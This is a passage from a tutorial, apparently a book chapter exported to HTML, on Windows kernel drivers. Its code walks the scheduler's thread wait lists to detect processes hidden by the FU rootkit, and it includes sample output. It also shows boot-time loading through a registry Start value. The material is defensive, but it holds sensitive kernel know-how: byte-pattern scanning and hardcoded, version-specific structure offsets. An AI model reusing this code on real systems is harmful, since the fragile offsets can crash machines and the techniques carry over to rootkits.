style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
( i = 0 ; i &lt;= 500 ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>procs1[i].pid
= procs[i].pid = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>procs1[i].name[0]
= procs[i].name[0] = 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitOutListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pid
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nameptr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>insert(pid,nameptr,&amp;nprocs);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>start
= (LIST_ENTRY *)gKiWaitInListHead;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start-&gt;Flink;<span style="mso-spacerun: yes">      </span><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pid
= *((long *)((long)cur + 388));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nameptr
= (unsigned char *)(*((long *)((long)cur + 464))) + 508;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>insert(pid,nameptr,&amp;nprocs);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= start = (LIST_ENTRY *)((long)p1 + 160);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>do<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>pid
= *(long *)((long)cur -4);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>insert1(pid,(char
*)((long)cur + 348),&amp;nprocs1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cur
= cur-&gt;Flink;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}
while(cur != start);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;nprocs=%d
nprocs1=%d&quot;,nprocs,nprocs1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0 ; i &lt; nprocs ; i++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>found
= 0;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for
( j = 0 ; j &lt; nprocs1 ; j++)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( procs[i].pid == procs1[j].pid)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>found
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if
( found == 0 &amp;&amp; procs[i].pid != 0)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;%s
%d has been hidden&quot;,procs[i].name,procs[i].pid);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeCancelTimer(
gTimer );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ExFreePool(
gTimer );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ExFreePool(
gDPCP );<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ptr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>int
i;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>p1
= (PEPROCESS)PsGetCurrentProcess();<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr
= (unsigned char *)KeWaitForSingleObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 4096; i++ ) <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>if(*ptr
== 0xb9 &amp;&amp; *(ptr+5) == 0x84 &amp;&amp; *(ptr+6) == 0xc0 &amp;&amp;
*(ptr+24) == 0xb9)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitInListHead
= *(long *)(ptr + 1);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gKiWaitOutListHead
= *(long *)(ptr + 25);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>break;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr++;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gTimer
= ExAllocatePool (NonPagedPool,sizeof(KTIMER));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>gDPCP
= ExAllocatePool(NonPagedPool,sizeof(KDPC));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeInitializeTimer
(gTimer);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeInitializeDpc
(gDPCP,abc,0);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>KeSetTimerEx
(gTimer,timeout,10000,gDPCP);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>nprocs=34
nprocs1=32<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>smss.exe
156 has been hidden<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>winlogon.exe
176 has been hidden<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>cmd.exe
344 has been hidden<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>This
program combines the best of both worlds. It adds the timer code so that the
abc function gets called every ten seconds. In this function we place the code
for filling the arrays etc. The only difference is that earlier we made nprocs
and nprocs1 global. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
the first time the abc function gets called they get set to a value, the second
time being global they retain the values and the arrays procs and procs1 also
retain their values. Thus each time abc gets called we want to populate the two
arrays from scratch. Thus we initialize the pid and name members to zero and
pass the addresses of nprocs and nprocs1 to the insert functions. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
in timer code it is always advisable to not use global variables. The code
works as advertised. We use fu to hide a process and within 10 seconds we get
the above output. The only problem was that when we merged the code of the
timer into the earlier program, we kept getting the blue screen of death. It
took us 4 hours of rebooting to figure out where we are going wrong. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Whenever
the timer gets called and we are doing nothing, the cur points to a EPROCESS
structure of the program called Idle with a pid of 0. The only problem with
this Idle chap is that both Flink and Blink are zero. Thus whenever the timer
got called the second time, Idle was active and we got a BSoD. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Thus
we set the p1 variable in DriverEntry which points to System. As the list of
process is circular it does not matter where we start. We cover all of them.
Nobody told us that Idle has a Flink and Blink of 0. If they did we would not
have wasted 4 hours. Tough life for Device Driver programmers. <o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P59<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>y.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>val
= 1;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,
&quot;Start&quot;, 0, REG_DWORD, (PBYTE)&amp;val, sizeof(val));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>RegSetValueEx(hkey,&quot;ImagePath&quot;,0,REG_EXPAND_SZ,(PBYTE)imgName,strlen(imgName));<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>The
problem with our code so far was that we would load it each time. There is a
simply way to get windows load our driver each time. We simply set the start
key to value of 1. This tells windows to load the driver at boot up. If you
want to use the CreateService function instead change the 6<sup>th</sup>
parameter SERVICE_DEMAND_START to SERVICE_SYSTEM_START. This option sets the
registry value to 1 as we do.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>Now
each time someone hides our program, we get called.<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'><![if !supportEmptyParas]>&nbsp;<![endif]><o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>P60<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>r.c<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;ntddk.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>#include
&lt;stdio.h&gt;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverDispatcher(PDEVICE_OBJECT pDeviceObject, PIRP Irp)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;IRP_MJ_CREATE\n&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>IoCompleteRequest(Irp,
IO_NO_INCREMENT);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>return(STATUS_SUCCESS);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>VOID
DriverUnload(PDRIVER_OBJECT DriverObject)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>DbgPrint(&quot;Unloading&quot;);<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>}<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>NTSTATUS
DriverEntry(PDRIVER_OBJECT driverObject, PUNICODE_STRING RegistryPath)<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>{<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>long
gKiWaitOutListHead,i,val;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>unsigned
char *ptr,*namePtr;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>LIST_ENTRY
*cur, *start;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;DriverUnload
= DriverUnload;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>driverObject-&gt;MajorFunction[IRP_MJ_CREATE]
= DriverDispatcher;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>ptr
= (unsigned char *) KeWaitForSingleObject;<o:p></o:p></span></p>

<p class=MsoNormal style='text-align:justify;tab-stops:.5in'><span
style='font-size:10.0pt;mso-bidi-font-size:8.0pt;font-family:"Bookman Old Style"'>for(
i = 0; i &lt; 4096; i++ ) <o:p></o:p></span></p>

